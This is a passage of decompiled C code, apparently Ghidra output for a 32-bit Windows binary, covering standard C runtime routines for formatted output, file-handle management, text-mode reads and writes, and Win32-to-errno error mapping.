        iVar2 = (**(code **)(param_1 + 8))
                          (*(undefined4 *)(param_1 + 0xc),"00000000000000000000000000000000",uVar6);
        *(int *)(param_1 + 0xc) = iVar2;
        if (iVar2 == 0) {
          return 0xffffffff;
        }
        *(int *)(param_1 + 0x30) = *(int *)(param_1 + 0x30) + uVar6;
      }
      uVar5 = uVar3 - uVar6;
      bVar1 = (int)uVar6 <= (int)uVar3;
      uVar3 = uVar5;
    } while (uVar5 != 0 && bVar1);
  }
  if (0 < *(int *)(param_1 + 0x24)) {
    iVar2 = (**(code **)(param_1 + 8))
                      (*(undefined4 *)(param_1 + 0xc),
                       *(int *)(param_1 + 0x1c) + *(int *)(param_1 + 0x10),
                       *(undefined4 *)(param_1 + 0x24));
    *(int *)(param_1 + 0xc) = iVar2;
    if (iVar2 == 0) {
      return 0xffffffff;
    }
    *(int *)(param_1 + 0x30) = *(int *)(param_1 + 0x30) + *(int *)(param_1 + 0x24);
  }
  if ((0 < *(int *)(param_1 + 0x28)) &&
     (uVar3 = *(uint *)(param_1 + 0x28), 0 < (int)*(uint *)(param_1 + 0x28))) {
    do {
      uVar6 = uVar3;
      if (0x20 < uVar3) {
        uVar6 = 0x20;
      }
      if (0 < (int)uVar6) {
        iVar2 = (**(code **)(param_1 + 8))
                          (*(undefined4 *)(param_1 + 0xc),"00000000000000000000000000000000",uVar6);
        *(int *)(param_1 + 0xc) = iVar2;
        if (iVar2 == 0) {
          return 0xffffffff;
        }
        *(int *)(param_1 + 0x30) = *(int *)(param_1 + 0x30) + uVar6;
      }
      uVar5 = uVar3 - uVar6;
      bVar1 = (int)uVar6 <= (int)uVar3;
      uVar3 = uVar5;
    } while (uVar5 != 0 && bVar1);
  }
  if ((((*(ushort *)(param_1 + 0x38) & 4) != 0) && (0 < (int)uVar4)) && (0 < (int)uVar4)) {
    do {
      uVar3 = uVar4;
      if (0x20 < uVar4) {
        uVar3 = 0x20;
      }
      if (0 < (int)uVar3) {
        iVar2 = (**(code **)(param_1 + 8))
                          (*(undefined4 *)(param_1 + 0xc),"                                ",uVar3);
        *(int *)(param_1 + 0xc) = iVar2;
        if (iVar2 == 0) {
          return 0xffffffff;
        }
        *(int *)(param_1 + 0x30) = *(int *)(param_1 + 0x30) + uVar3;
      }
      uVar6 = uVar4 - uVar3;
      bVar1 = (int)uVar3 <= (int)uVar4;
      uVar4 = uVar6;
    } while (uVar6 != 0 && bVar1);
  }
  return 0;
}



void __cdecl FUN_00407030(LPCSTR param_1,uint param_2)

{
  uint uVar1;
  
  if ((param_2 & 3) == 3) {
    uVar1 = 2;
  }
  else {
    uVar1 = 0;
    if ((param_2 & 2) != 0) {
      uVar1 = 1;
    }
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 0x10) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  if ((param_2 & 0x20) == 0) {
    uVar1 = uVar1 | 0x4000;
  }
  else {
    uVar1 = uVar1 | 0x8000;
  }
  if ((param_2 & 0x10000) == 0) {
    FUN_00408730(param_1,uVar1,0x180);
  }
  else if ((param_2 & 2) == 0) {
    FUN_00408760(param_1,uVar1,0x20,0x180);
  }
  else {
    FUN_00408760(param_1,uVar1,0x10,0x180);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 __cdecl FUN_004070e0(uint param_1,LONG param_2,LONG param_3,DWORD param_4)

{
  byte *pbVar1;
  DWORD DVar2;
  HANDLE hFile;
  DWORD DVar3;
  LONG local_8;
  
  if ((param_1 < DAT_0040e300) &&
     ((*(byte *)((&DAT_0040e304)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    hFile = (HANDLE)FUN_00407980(param_1);
    if (hFile == (HANDLE)0xffffffff) {
      _DAT_0040d334 = 9;
      DVar2 = 0xffffffff;
      local_8 = -1;
    }
    else {
      local_8 = param_3;
      DVar2 = SetFilePointer(hFile,param_2,&local_8,param_4);
      if (DVar2 == 0xffffffff) {
        DVar3 = GetLastError();
        if (DVar3 != 0) {
          FUN_00407aa0(DVar3);
          DVar2 = 0xffffffff;
          local_8 = -1;
          goto LAB_0040719f;
        }
      }
      pbVar1 = (byte *)((&DAT_0040e304)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8);
      *pbVar1 = *pbVar1 & 0xfd;
    }
  }
  else {
    _DAT_0040d334 = 9;
    DVar2 = 0xffffffff;
    local_8 = -1;
  }
LAB_0040719f:
  return CONCAT44(local_8,DVar2);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_004071b0(uint param_1,LPCSTR param_2,DWORD param_3)

{
  int iVar1;
  byte *pbVar2;
  HANDLE pvVar3;
  BOOL BVar4;
  DWORD DVar5;
  UINT UVar6;
  int iVar7;
  char *pcVar8;
  LPCSTR lpBuffer;
  char *pcVar9;
  int local_10;
  char local_9;
  DWORD local_8;
  
  if ((param_1 < DAT_0040e300) &&
     (iVar7 = (int)param_1 >> 5,
     (*(byte *)((&DAT_0040e304)[iVar7] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    if ((param_3 == 0) || ((*(byte *)((&DAT_0040e304)[iVar7] + 4 + (param_1 & 0x1f) * 8) & 2) != 0))
    {
      local_10 = 0;
    }
    else {
      iVar1 = (&DAT_0040e304)[iVar7] + (param_1 & 0x1f) * 8;
      local_10 = 0;
      lpBuffer = param_2;
      if (((*(byte *)(iVar1 + 4) & 0x48) != 0) && (local_10 = 0, *(char *)(iVar1 + 5) != '\n')) {
        *param_2 = *(CHAR *)((&DAT_0040e304)[iVar7] + 5 + (param_1 & 0x1f) * 8);
        lpBuffer = param_2 + 1;
        param_3 = param_3 - 1;
        *(undefined *)((&DAT_0040e304)[iVar7] + 5 + (param_1 & 0x1f) * 8) = 10;
        local_10 = 1;
      }
      pvVar3 = (HANDLE)FUN_00407980(param_1);
      BVar4 = ReadFile(pvVar3,lpBuffer,param_3,&local_8,(LPOVERLAPPED)0x0);
      if (BVar4 == 0) {
        DVar5 = GetLastError();
        if (DVar5 == 5) {
          _DAT_0040d334 = 9;
          local_10 = -1;
        }
        else if (DVar5 == 0x6d) {
          local_10 = 0;
        }
        else {
          FUN_00407aa0(DVar5);
          local_10 = -1;
        }
      }
      else {
        local_10 = local_10 + local_8;
        if ((*(byte *)((&DAT_0040e304)[iVar7] + 4 + (param_1 & 0x1f) * 8) & 0x80) != 0) {
          pcVar8 = param_2;
          pcVar9 = param_2;
          if ((local_8 == 0) || (*param_2 != '\n')) {
            pbVar2 = (byte *)((&DAT_0040e304)[iVar7] + 4 + (param_1 & 0x1f) * 8);
            *pbVar2 = *pbVar2 & 0xfb;
          }
          else {
            pbVar2 = (byte *)((&DAT_0040e304)[iVar7] + 4 + (param_1 & 0x1f) * 8);
            *pbVar2 = *pbVar2 | 4;
          }
          while (pcVar9 < param_2 + local_10) {
            if (*pcVar9 == '\x1a') {
              if ((*(byte *)((&DAT_0040e304)[iVar7] + 4 + (param_1 & 0x1f) * 8) & 0x40) == 0) {
                pbVar2 = (byte *)((&DAT_0040e304)[iVar7] + 4 + (param_1 & 0x1f) * 8);
                *pbVar2 = *pbVar2 | 2;
              }
              break;
            }
            if (*pcVar9 == '\r') {
              if (pcVar9 < param_2 + local_10 + -1) {
                if (pcVar9[1] == '\n') {
                  *pcVar8 = '\n';
                  pcVar8 = pcVar8 + 1;
                  pcVar9 = pcVar9 + 2;
                }
                else {
                  *pcVar8 = *pcVar9;
                  pcVar8 = pcVar8 + 1;
                  pcVar9 = pcVar9 + 1;
                }
              }
              else {
                pcVar9 = pcVar9 + 1;
                pvVar3 = (HANDLE)FUN_00407980(param_1);
                BVar4 = ReadFile(pvVar3,&local_9,1,&local_8,(LPOVERLAPPED)0x0);
                if ((BVar4 == 0) || (local_8 == 0)) {
                  *pcVar8 = '\r';
                  pcVar8 = pcVar8 + 1;
                }
                else if ((*(byte *)((&DAT_0040e304)[iVar7] + 4 + (param_1 & 0x1f) * 8) & 0x48) == 0)
                {
                  if ((pcVar8 == param_2) && (local_9 == '\n')) {
                    *pcVar8 = '\n';
                    pcVar8 = pcVar8 + 1;
                  }
                  else {
                    FUN_00408af0(param_1,-1,1);
                    if (local_9 != '\n') {
                      *pcVar8 = '\r';
                      pcVar8 = pcVar8 + 1;
                    }
                  }
                }
                else if (local_9 == '\n') {
                  *pcVar8 = '\n';
                  pcVar8 = pcVar8 + 1;
                }
                else {
                  *pcVar8 = '\r';
                  *(char *)((&DAT_0040e304)[iVar7] + 5 + (param_1 & 0x1f) * 8) = local_9;
                  pcVar8 = pcVar8 + 1;
                }
              }
            }
            else {
              *pcVar8 = *pcVar9;
              pcVar8 = pcVar8 + 1;
              pcVar9 = pcVar9 + 1;
            }
          }
          local_10 = (int)pcVar8 - (int)param_2;
          if ((*(byte *)((&DAT_0040e304)[iVar7] + 4 + (param_1 & 0x1f) * 8) & 0x40) != 0) {
            pvVar3 = (HANDLE)FUN_00407980(param_1);
            BVar4 = GetConsoleMode(pvVar3,&local_8);
            if (BVar4 != 0) {
              UVar6 = GetConsoleCP();
              FUN_00408b90(DAT_0040d9a0,UVar6,param_2,local_10);
            }
          }
        }
      }
    }
  }
  else {
    _DAT_0040d334 = 9;
    local_10 = -1;
  }
  return local_10;
}



void FUN_004074c0(void)

{
  FUN_00408c40(6);
  FUN_00404720(1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_004074e0(uint param_1,char *param_2,uint param_3)

{
  HANDLE pvVar1;
  BOOL BVar2;
  UINT UVar3;
  int iVar4;
  uint uVar5;
  DWORD DVar6;
  char *local_418;
  int local_414;
  char *local_410;
  char local_409 [1025];
  uint local_8;
  
  if ((param_1 < DAT_0040e300) &&
     (iVar4 = (int)param_1 >> 5,
     (*(byte *)((&DAT_0040e304)[iVar4] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    if (param_3 == 0) {
      local_414 = 0;
    }
    else {
      if ((*(byte *)((&DAT_0040e304)[iVar4] + 4 + (param_1 & 0x1f) * 8) & 0x20) != 0) {
        FUN_00408af0(param_1,0,2);
      }
      if ((*(byte *)((&DAT_0040e304)[iVar4] + 4 + (param_1 & 0x1f) * 8) & 0x80) == 0) {
        pvVar1 = (HANDLE)FUN_00407980(param_1);
        BVar2 = WriteFile(pvVar1,param_2,param_3,&local_8,(LPOVERLAPPED)0x0);
        if (BVar2 == 0) {
          DVar6 = GetLastError();
          uVar5 = 0;
          local_414 = 0;
        }
        else {
          DVar6 = 0;
          local_414 = 0;
          uVar5 = local_8;
        }
      }
      else {
        local_410 = param_2;
        uVar5 = 0;
        local_414 = 0;
        do {
          DVar6 = 0;
          if (param_3 <= (uint)((int)local_410 - (int)param_2)) break;
          local_418 = local_409;
          for (; ((int)local_418 - (int)local_409 < 0x400 &&
                 ((uint)((int)local_410 - (int)param_2) < param_3)); local_410 = local_410 + 1) {
            if (*local_410 == '\n') {
              local_414 = local_414 + 1;
              *local_418 = '\r';
              local_418 = local_418 + 1;
            }
            *local_418 = *local_410;
            local_418 = local_418 + 1;
          }
          if ((*(byte *)((&DAT_0040e304)[iVar4] + 4 + (param_1 & 0x1f) * 8) & 0x40) != 0) {
            pvVar1 = (HANDLE)FUN_00407980(param_1);
            BVar2 = GetConsoleMode(pvVar1,&local_8);
            if (BVar2 != 0) {
              UVar3 = GetConsoleOutputCP();
              FUN_00408b90(UVar3,DAT_0040d9a0,local_409,(int)local_418 - (int)local_409);
            }
          }
          pvVar1 = (HANDLE)FUN_00407980(param_1);
          BVar2 = WriteFile(pvVar1,local_409,(int)local_418 - (int)local_409,&local_8,
                            (LPOVERLAPPED)0x0);
          if (BVar2 == 0) {
            DVar6 = GetLastError();
            break;
          }
          uVar5 = uVar5 + local_8;
          DVar6 = 0;
        } while ((uint)((int)local_418 - (int)local_409) <= local_8);
      }
      if (uVar5 == 0) {
        if (DVar6 == 0) {
          if (((*(byte *)((&DAT_0040e304)[iVar4] + 4 + (param_1 & 0x1f) * 8) & 0x40) == 0) ||
             (*param_2 != '\x1a')) {
            _DAT_0040d334 = 0x1c;
            local_414 = -1;
          }
          else {
            local_414 = 0;
          }
        }
        else {
          if (DVar6 == 5) {
            _DAT_0040d334 = 9;
          }
          else {
            FUN_00407aa0(DVar6);
          }
          local_414 = -1;
        }
      }
      else {
        local_414 = uVar5 - local_414;
      }
    }
  }
  else {
    _DAT_0040d334 = 9;
    local_414 = -1;
  }
  return local_414;
}



int FUN_00407790(void)

{
  uint *puVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  
  iVar2 = 0;
  iVar3 = -1;
  do {
    if ((&DAT_0040e304)[iVar2] == 0) {
      puVar1 = FUN_00403d00(0x100);
      if (puVar1 != (uint *)0x0) {
        (&DAT_0040e304)[iVar2] = puVar1;
        DAT_0040e300 = DAT_0040e300 + 0x20;
        for (; puVar1 < (uint *)((&DAT_0040e304)[iVar2] + 0x100); puVar1 = puVar1 + 2) {
          *(undefined *)(puVar1 + 1) = 0;
          *puVar1 = 0xffffffff;
          *(undefined *)((int)puVar1 + 5) = 10;
        }
        iVar3 = iVar2 << 5;
      }
      return iVar3;
    }
    for (puVar4 = (undefined4 *)(&DAT_0040e304)[iVar2];
        puVar4 < (undefined4 *)((&DAT_0040e304)[iVar2] + 0x100); puVar4 = puVar4 + 2) {
      if ((*(byte *)(puVar4 + 1) & 1) == 0) {
        *puVar4 = 0xffffffff;
        iVar3 = iVar2 * 0x20 + ((int)puVar4 - (&DAT_0040e304)[iVar2] >> 3);
        break;
      }
    }
    if (iVar3 != -1) {
      return iVar3;
    }
    iVar2 = iVar2 + 1;
    if (0x3f < iVar2) {
      return -1;
    }
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00407850(uint param_1)

{
  int *piVar1;
  
  if (param_1 < DAT_0040e300) {
    piVar1 = (int *)((&DAT_0040e304)[(int)param_1 >> 5] + (param_1 & 0x1f) * 8);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (param_1 == 0) {
        SetStdHandle(0xfffffff6,(HANDLE)0x0);
      }
      else if (param_1 == 1) {
        SetStdHandle(0xfffffff5,(HANDLE)0x0);
      }
      else if (param_1 == 2) {
        SetStdHandle(0xfffffff4,(HANDLE)0x0);
      }
      *(undefined4 *)((&DAT_0040e304)[(int)param_1 >> 5] + (param_1 & 0x1f) * 8) = 0xffffffff;
      return 0;
    }
  }
  _DAT_0040d334 = 9;
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_004078f0(uint param_1,HANDLE param_2)

{
  undefined4 uVar1;
  
  if ((param_1 < DAT_0040e300) &&
     (*(int *)((&DAT_0040e304)[(int)param_1 >> 5] + (param_1 & 0x1f) * 8) == -1)) {
    if (param_1 == 0) {
      SetStdHandle(0xfffffff6,param_2);
    }
    else if (param_1 == 1) {
      SetStdHandle(0xfffffff5,param_2);
    }
    else if (param_1 == 2) {
      SetStdHandle(0xfffffff4,param_2);
    }
    *(HANDLE *)((&DAT_0040e304)[(int)param_1 >> 5] + (param_1 & 0x1f) * 8) = param_2;
    uVar1 = 0;
  }
  else {
    _DAT_0040d334 = 9;
    uVar1 = 0xffffffff;
  }
  return uVar1;
}



undefined4 __cdecl FUN_00407980(uint param_1)

{
  return *(undefined4 *)((&DAT_0040e304)[(int)param_1 >> 5] + (param_1 & 0x1f) * 8);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00407aa0(int param_1)

{
  if (param_1 == 0x9b) {
    _DAT_0040d334 = 0xb;
    return;
  }
  if (param_1 == 0x9e) {
    _DAT_0040d334 = 0xd;
    return;
  }
  if (param_1 < 0x9f) {
    switch(param_1) {
    case 0x6c:
switchD_00407acc_caseD_6c:
      _DAT_0040d334 = 0xd;
      return;
    case 0x6d:
      _DAT_0040d334 = 0x20;
      return;
    case 0x6e:
      break;
    case 0x6f:
      _DAT_0040d334 = 0x26;
      return;
    case 0x70:
      _DAT_0040d334 = 0x1c;
      return;
    case 0x71:
switchD_00407acc_caseD_71:
      _DAT_0040d334 = 0xb;
      return;
    case 0x72:
switchD_00407acc_caseD_72:
      _DAT_0040d334 = 9;
      return;
    case -0x452e541f:
      if (param_1 < 0x85) {
        switch(param_1) {
        case 0x80:
        case 0x81:
          _DAT_0040d334 = 10;
          return;
        case 0x82:
          goto switchD_00407acc_caseD_72;
        case 0x84:
          goto switchD_00407acc_caseD_6c;
        }
      }
      else if (param_1 == 0x91) {
        _DAT_0040d334 = 0x29;
        return;
      }
      break;
    default:
      switch(param_1) {
      case 1:
      case 0xc:
      case 0xd:
      case 0xe:
      case 0x23:
      case 0x25:
      case 0x26:
      case 0x27:
      case 0x28:
      case 0x29:
      case 0x2a:
      case 0x2b:
      case 0x2c:
      case 0x2d:
      case 0x2e:
      case 0x2f:
      case 0x30:
      case 0x31:
      case 0x32:
      case 0x33:
      case 0x34:
      case 0x36:
      case 0x37:
      case 0x38:
      case 0x39:
      case 0x3a:
      case 0x3b:
      case 0x3c:
      case 0x3d:
      case 0x3e:
      case 0x3f:
      case 0x40:
      case 0x42:
        break;
      case 2:
      case 3:
      case 0xf:
      case 0x12:
      case 0x35:
      case 0x43:
        goto switchD_00407ae3_caseD_2;
      case 4:
        _DAT_0040d334 = 0x18;
        return;
      case 5:
      case 0x10:
      case 0x13:
      case 0x14:
      case 0x15:
      case 0x16:
      case 0x17:
      case 0x18:
      case 0x19:
      case 0x1a:
      case 0x1b:
      case 0x1c:
      case 0x1d:
      case 0x1e:
      case 0x1f:
      case 0x20:
      case 0x21:
      case 0x22:
      case 0x24:
      case 0x41:
        goto switchD_00407acc_caseD_6c;
      case 6:
        goto switchD_00407acc_caseD_72;
      case 7:
      case 8:
      case 9:
        _DAT_0040d334 = 0xc;
        return;
      case 10:
        _DAT_0040d334 = 7;
        return;
      case 0xb:
switchD_00407ae3_caseD_b:
        _DAT_0040d334 = 8;
        return;
      case 0x11:
        _DAT_0040d334 = 0x12;
        return;
      default:
        switch(param_1) {
        case 0x50:
switchD_00407afe_caseD_50:
          _DAT_0040d334 = 0x11;
          return;
        default:
          break;
        case 0x52:
        case 0x53:
          goto switchD_00407acc_caseD_6c;
        case 0x59:
          goto switchD_00407acc_caseD_71;
        }
      }
    }
  }
  else {
    if (param_1 == 0xce) {
switchD_00407ae3_caseD_2:
      _DAT_0040d334 = 2;
      return;
    }
    if (param_1 < 0xcf) {
      if (param_1 == 0xa1) {
        _DAT_0040d334 = 2;
        return;
      }
      if (param_1 == 0xa4) {
        _DAT_0040d334 = 0xb;
        return;
      }
      if (0xa0 < param_1) {
        switch(param_1) {
        case 0xa7:
          goto switchD_00407acc_caseD_6c;
        case 0xaa:
          _DAT_0040d334 = 0x10;
          return;
        case 0xb7:
          goto switchD_00407afe_caseD_50;
        case 0xbc:
        case 0xbd:
        case 0xbe:
        case 0xbf:
        case 0xc0:
        case 0xc1:
        case 0xc2:
        case 0xc3:
        case 0xc4:
        case 0xc5:
        case 0xc6:
        case 199:
        case 200:
        case 0xc9:
        case 0xca:
          goto switchD_00407ae3_caseD_b;
        }
      }
    }
    else {
      if (param_1 == 0xd7) {
        _DAT_0040d334 = 0xb;
        return;
      }
      if ((0xd6 < param_1) && (param_1 == 0x718)) {
        _DAT_0040d334 = 0xc;
        return;
      }
    }
  }
  _DAT_0040d334 = 0x16;
  return;
}



undefined4 __cdecl FUN_00407c40(LPCSTR param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  
  BVar1 = DeleteFileA(param_1);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    FUN_00407aa0(DVar2);
    return 0xffffffff;
  }
  return 0;
}



undefined4 __cdecl FUN_00407c70(undefined4 param_1)

{
  return param_1;
}



undefined8 FUN_00407c80(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_3;
  uVar8 = param_2;
  uVar6 = param_4;
  uVar9 = param_1;
  if (param_2 == 0) {
    uVar3 = param_4 / param_1;
    iVar4 = (int)(((ulonglong)param_4 % (ulonglong)param_1 << 0x20 | (ulonglong)param_3) /
                 (ulonglong)param_1);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_1 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_2;
    if (((CARRY4(uVar3,iVar4 * param_2)) || (param_4 < uVar8)) ||
       ((param_4 <= uVar8 && (param_3 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



int __cdecl FUN_00407d30(int param_1,int param_2)

{
  int iVar1;
  BOOL BVar2;
  
  if (((param_1 < 1) || (0x2b < param_1)) || (param_2 == -1)) {
    iVar1 = -1;
  }
  else {
    if ((param_1 == 2) && (DAT_0040d898 == '\0')) {
      BVar2 = SetConsoleCtrlHandler((PHANDLER_ROUTINE)&LAB_00407cf0,1);
      if (BVar2 == 0) {
        return -1;
      }
      DAT_0040d898 = '\x01';
    }
    iVar1 = *(int *)(&DAT_0040d284 + param_1 * 4);
    *(int *)(&DAT_0040d284 + param_1 * 4) = param_2;
  }
  return iVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00407d90(LPWSTR param_1,LPCSTR param_2)

{
  int iVar1;
  
  if (*param_2 == '\0') {
    if (param_1 != (LPWSTR)0x0) {
      *param_1 = L'\0';
    }
    return 0;
  }
  iVar1 = MultiByteToWideChar(DAT_0040d9a0,9,param_2,1,param_1,(uint)(param_1 != (LPWSTR)0x0));
  if (iVar1 == 0) {
    _DAT_0040d334 = 0x2a;
    return 0xffffffff;
  }
  return 1;
}



undefined4 __cdecl FUN_00407de0(int param_1,wchar_t *param_2)

{
  int iVar1;
  uint uVar2;
  uint *puVar3;
  int iVar4;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar5;
  uint local_60;
  undefined4 uVar6;
  uint local_54 [16];
  undefined4 local_14;
  undefined4 local_10;
  undefined8 local_c;
  
  if (*(int *)(param_1 + 0x2c) < 0) {
    iVar1 = 0x7fffffff;
  }
  else {
    iVar1 = *(int *)(param_1 + 0x2c);
  }
  uVar2 = *(int *)(param_1 + 0x34) + (uint)DAT_0040d89c;
  local_14 = 0;
  local_10 = 0;
  if (((*(ushort *)(param_1 + 0x38) & 4) == 0) && (0x40 < uVar2)) {
    puVar3 = FUN_00403d00(uVar2);
    if (puVar3 == (uint *)0x0) {
      return 0xffffffff;
    }
  }
  else {
    uVar2 = 0x40;
    puVar3 = local_54;
  }
  if (*(char *)(param_1 + 0x3b) == '\0') {
    if (param_2 == (wchar_t *)0x0) {
      param_2 = L"(null)";
    }
  }
  else if (param_2 == (wchar_t *)0x0) {
    FUN_00408710(0x16);
    return 0xffffffff;
  }
  do {
    uVar6 = 0;
    if (iVar1 < 1) {
LAB_00407f40:
      iVar1 = FUN_00406dc0(param_1,puVar3);
      if (iVar1 < 0) {
        uVar6 = 0xffffffff;
      }
      *(undefined4 *)(param_1 + 0x34) = 0;
      *(undefined4 *)(param_1 + 0x14) = 0;
      if (puVar3 != local_54) {
        FUN_004040b0(puVar3);
      }
      return uVar6;
    }
    local_60 = FUN_00408d40((byte *)&local_c,*param_2,&local_14);
    if (((int)local_60 < 0) || ((*param_2 == L'\0' && (local_60 = local_60 - 1, (int)local_60 < 0)))
       ) {
      uVar6 = 0xffffffff;
      goto LAB_00407f40;
    }
    uVar6 = 0;
    if (iVar1 < (int)local_60) goto LAB_00407f40;
    uVar6 = extraout_ECX;
    uVar5 = extraout_EDX;
    if (uVar2 < *(int *)(param_1 + 0x14) + local_60) {
      *(undefined4 *)(param_1 + 0x34) = 0;
      iVar4 = FUN_00406dc0(param_1,puVar3);
      if (iVar4 < 0) {
        uVar6 = 0xffffffff;
        goto LAB_00407f40;
      }
      *(undefined4 *)(param_1 + 0x14) = 0;
      uVar6 = extraout_ECX_00;
      uVar5 = extraout_EDX_00;
    }
    FUN_00404a40(uVar6,uVar5,(undefined8 *)(*(int *)(param_1 + 0x14) + (int)puVar3),&local_c,
                 local_60);
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + local_60;
    uVar6 = 0;
    if (*param_2 == L'\0') goto LAB_00407f40;
    param_2 = param_2 + 1;
    iVar1 = iVar1 - local_60;
  } while( true );
}



void __cdecl FUN_00407f80(undefined8 *param_1,char param_2)

{
  uint uVar1;
  int iVar2;
  uint extraout_ECX;
  uint uVar3;
  bool bVar4;
  undefined8 uVar5;
  longlong lVar6;
  uint local_3c;
  uint local_38;
  uint local_30;
  uint local_2c;
  uint local_28;
  undefined4 local_20;
  undefined8 auStack_1c [2];
  char local_5;
  
  local_20 = "0123456789ABCDEF";
  if (param_2 != 'X') {
    local_20 = "0123456789abcdef";
  }
  if (param_2 == 'o') {
    uVar3 = 8;
  }
  else if ((param_2 == 'x') || (param_2 == 'X')) {
    uVar3 = 0x10;
  }
  else {
    uVar3 = 10;
  }
  local_2c = *(uint *)param_1;
  local_28 = *(uint *)((int)param_1 + 4);
  if ((((param_2 == 'd') || (param_2 == 'i')) && (*(int *)((int)param_1 + 4) < 1)) &&
     (*(int *)((int)param_1 + 4) < 0)) {
    bVar4 = local_2c != 0;
    local_2c = -local_2c;
    local_28 = -(local_28 + bVar4);
  }
  if (((local_28 != 0) || (local_2c != 0)) || (local_30 = 0x18, *(int *)((int)param_1 + 0x2c) != 0))
  {
    uVar5 = FUN_00408fb0(uVar3,0,local_2c,local_28);
    local_5 = local_20[(int)uVar5];
    local_30 = 0x17;
  }
  uVar5 = FUN_00407c80(uVar3,0,local_2c,local_28);
  *param_1 = uVar5;
  uVar1 = extraout_ECX;
  while( true ) {
    if (((*(int *)((int)param_1 + 4) < 0) ||
        ((*(int *)((int)param_1 + 4) < 1 && (*(int *)param_1 == 0)))) || ((int)local_30 < 1)) break;
    uVar5 = FUN_00409030(uVar3,0,*(uint *)param_1,*(uint *)((int)param_1 + 4));
    uVar1 = local_30 - 1;
    local_3c = (uint)uVar5;
    local_38 = (uint)((ulonglong)uVar5 >> 0x20);
    lVar6 = FUN_004090e0(uVar3,0,local_3c,local_38);
    *(char *)((int)auStack_1c + (local_30 - 1)) = local_20[*(int *)param_1 - (int)lVar6];
    *(uint *)param_1 = local_3c;
    *(uint *)((int)param_1 + 4) = local_38;
    local_30 = uVar1;
  }
  if ((((uVar3 == 8) && ((*(ushort *)(param_1 + 7) & 8) != 0)) && (local_30 < 0x18)) &&
     (*(char *)((int)auStack_1c + local_30) != '0')) {
    *(undefined *)((int)auStack_1c + (local_30 - 1)) = 0x30;
    local_30 = local_30 - 1;
  }
  *(uint *)((int)param_1 + 0x1c) = 0x18 - local_30;
  FUN_00404a40(uVar1,local_30,*(undefined8 **)(param_1 + 2),
               (undefined8 *)((int)auStack_1c + local_30),*(uint *)((int)param_1 + 0x1c));
  if (*(int *)((int)param_1 + 0x1c) < *(int *)((int)param_1 + 0x2c)) {
    *(int *)(param_1 + 3) = *(int *)((int)param_1 + 0x2c) - *(int *)((int)param_1 + 0x1c);
    *(ushort *)(param_1 + 7) = *(ushort *)(param_1 + 7) & 0xffef;
  }
  else if (((*(int *)((int)param_1 + 0x2c) < 0) && ((*(ushort *)(param_1 + 7) & 0x14) == 0x10)) &&
          (iVar2 = ((*(int *)((int)param_1 + 0x34) - *(int *)((int)param_1 + 0x14)) -
                   *(int *)(param_1 + 3)) - *(int *)((int)param_1 + 0x1c), 0 < iVar2)) {
    *(int *)(param_1 + 3) = iVar2;
  }
  return;
}



int __cdecl FUN_00408180(short *param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00409120(param_1);
  return (int)(short)uVar1;
}



undefined4 __cdecl FUN_00408190(double *param_1,char param_2)

{
  undefined *puVar1;
  undefined8 *puVar2;
  short sVar3;
  ushort uVar4;
  int iVar5;
  undefined8 *puVar6;
  char *pcVar7;
  uint uVar8;
  int iVar9;
  undefined4 uVar10;
  double *extraout_ECX;
  double *extraout_ECX_00;
  double *extraout_ECX_01;
  char cVar11;
  byte bVar12;
  double *extraout_EDX;
  char *pcVar13;
  double *pdVar14;
  double *pdVar15;
  byte *pbVar16;
  undefined8 uVar17;
  longlong lVar18;
  int local_60;
  int local_5c;
  short local_56;
  int local_54;
  double local_4c;
  double local_44;
  undefined local_3c [7];
  byte local_35 [33];
  double local_14;
  ushort local_6;
  
  local_14 = *param_1;
  if ((param_2 != 'a') && (param_2 != 'A')) {
    if (*(int *)((int)param_1 + 0x2c) < 0) {
      *(undefined4 *)((int)param_1 + 0x2c) = 6;
    }
    else if ((*(int *)((int)param_1 + 0x2c) == 0) && ((param_2 == 'g' || (param_2 == 'G')))) {
      *(undefined4 *)((int)param_1 + 0x2c) = 1;
    }
  }
